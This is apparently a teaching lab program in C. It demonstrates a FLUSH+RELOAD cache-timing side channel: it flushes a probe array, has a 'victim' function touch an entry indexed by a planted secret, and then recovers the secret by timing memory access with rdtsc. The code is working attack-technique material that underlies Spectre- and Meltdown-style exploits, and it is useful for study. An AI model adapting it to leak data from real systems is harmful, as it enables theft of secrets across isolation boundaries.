#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "cacheutils.h"

uint8_t array[256*4096];
int temp;
char secret = 94;
int CACHE_HIT_THRESHOLD;

#define DELTA 1024

void flushSideChannel()
{
  int i;

  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  //flush the values of the array from cache
  for (i = 0; i < 256; i++) flush(&array[i*4096 + DELTA]);
}

void victim()
{
  temp = array[secret*4096 + DELTA];
}

void reloadSideChannel() 
{
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
     time1 = rdtsc();
     maccess(&array[i*4096 + DELTA]);
     time2 = rdtsc() - time1;
     if (time2 <= CACHE_HIT_THRESHOLD){
         printf("array[%d*4096 + %d] is in cache.\n",i,DELTA);
         printf("The Secret = %d.\n",i);
     }
  }	
}

int main(int argc, const char **argv) 
{
  CACHE_HIT_THRESHOLD = detect_flush_reload_threshold();
  flushSideChannel();
  victim();
  reloadSideChannel();
  return (0);
}
